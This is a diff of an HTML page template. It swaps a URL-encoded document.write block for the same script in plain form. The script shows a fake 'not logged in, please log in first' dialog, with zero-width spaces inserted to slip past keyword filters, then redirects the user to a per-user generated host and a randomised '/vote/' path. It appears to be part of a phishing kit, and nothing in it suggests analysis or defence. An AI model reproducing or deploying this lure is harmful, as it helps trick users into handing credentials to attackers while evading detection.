@@ -1,5 +1,14 @@
-<script>
-<!--
-document.write(unescape("%3Cmeta%20id%3D%22viewport%22%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2Cminimum-scale%3D1%2Cmaximum-scale%3D1%2Cinitial-scale%3D1%2Cuser-scalable%3Dno%22%3E%0A%3Cbody%3E%3C/body%3E%0A%3Clink%20href%3D%22//cdn.bootcss.com/mui/3.7.1/css/mui.min.css%22%20rel%3D%22stylesheet%22%3E%0A%3Cscript%20src%3D%22//cdn.bootcss.com/mui/3.7.1/js/mui.min.js%22%3E%3C/script%3E%0A%3Cscript%3Emui.confirm%28%27%5Cu672a%5Cu200b%5Cu767b%5Cu200b%5Cu5f55%5Cu200b%5Cuff0c%5Cu200b%5Cu8bf7%5Cu200b%5Cu5148%5Cu200b%5Cu767b%5Cu200b%5Cu5f55%27%2C%20%27%5Cu672a%5Cu200b%5Cu767b%5Cu200b%5Cu5f55%27%2C%20%5B%27%5Cu662f%27%2C%20%27%5Cu5426%27%5D%2C%20function%20%28aaa%29%20%7B%20if%20%28aaa.index%20%3D%3D%200%29%20%7B%20window.location.href%20%3D%20%27http%3A//%3C%25%3Dfunc%28uid%29%25%3E%27+window.location.host.substring%28window.location.host.indexOf%28%27.%27%29%29%20+%20%22/%22%20+%20%22v%22%20+%20%22o%22%20+%20%22t%22%20+%20%22e/<%=ranStr[99]%>/%22%20%7D%20%7D%29%3C/script%3E"));
-//-->
-</script>
+<meta id="viewport" name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no">
+<body></body>
+<link href="//cdn.bootcss.com/mui/3.7.1/css/mui.min.css" rel="stylesheet">
+<script src="//cdn.bootcss.com/mui/3.7.1/js/mui.min.js"></script>
+<script>function randomString(len) {
+　　len = len || 32;
+　　var $chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678';
+　　var maxPos = $chars.length;
+　　var pwd = '';
+　　for (i = 0; i < len; i++) {
+　　　　pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
+　　}
+　　return pwd;
+}mui.confirm('\u672a\u200b\u767b\u200b\u5f55\u200b\uff0c\u200b\u8bf7\u200b\u5148\u200b\u767b\u200b\u5f55', '\u672a\u200b\u767b\u200b\u5f55', ['\u662f', '\u5426'], function (aaa) { if (aaa.index == 0) { window.location.href = 'http://<%=func(uid)%>'+window.location.host.substring(window.location.host.indexOf('.')) + "/" + "v" + "o" + "t" + "e/"+randomString(10) } })</script>
